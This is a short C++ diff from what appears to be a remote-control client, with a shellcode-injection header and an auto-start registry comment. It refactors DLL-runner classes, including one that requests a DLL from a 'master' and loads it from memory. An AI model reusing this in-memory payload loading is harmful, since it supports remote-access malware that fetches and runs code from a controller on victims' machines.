@@ -4,6 +4,7 @@
 #include "ShellcodeInj.h"
 #include <WS2tcpip.h>
 #include <common/commands.h>
+#include "common/dllRunner.h"
 #pragma comment(lib, "ws2_32.lib")
 
 // 自动启动注册表中的值
@@ -113,32 +114,6 @@ typedef struct PkgHeader {
 	}
 }PkgHeader;
 
-// A DLL runner.
-class DllRunner {
-public:
-	virtual void* LoadLibraryA(const char* path) = 0;
-	virtual FARPROC GetProcAddress(void* mod, const char* lpProcName) = 0;
-	virtual BOOL FreeLibrary(void* mod) = 0;
-};
-
-// Default DLL runner.
-class DefaultDllRunner : public DllRunner {
-private:
-	HMODULE m_mod;
-public:
-	DefaultDllRunner() : m_mod(nullptr) {}
-	// Load DLL from the disk.
-	virtual void* LoadLibraryA(const char* path) {
-		return m_mod = ::LoadLibraryA(path);
-	}
-	virtual FARPROC GetProcAddress(void *mod, const char* lpProcName) {
-		return ::GetProcAddress(m_mod, lpProcName);
-	}
-	virtual BOOL FreeLibrary(void* mod) {
-		return ::FreeLibrary(m_mod);
-	}
-};
-
 // Memory DLL runner.
 class MemoryDllRunner : public DllRunner {
 protected:
@@ -239,7 +214,7 @@ public:
 		return buffer;
 	}
 	// Request DLL from the master.
-	virtual void* LoadLibraryA(const char* path) {
+	virtual void* LoadLibraryA(const char* path, int len=0) {
 		int size = 0;
 		auto buffer = ReceiveDll(size);
 		if (nullptr == buffer)
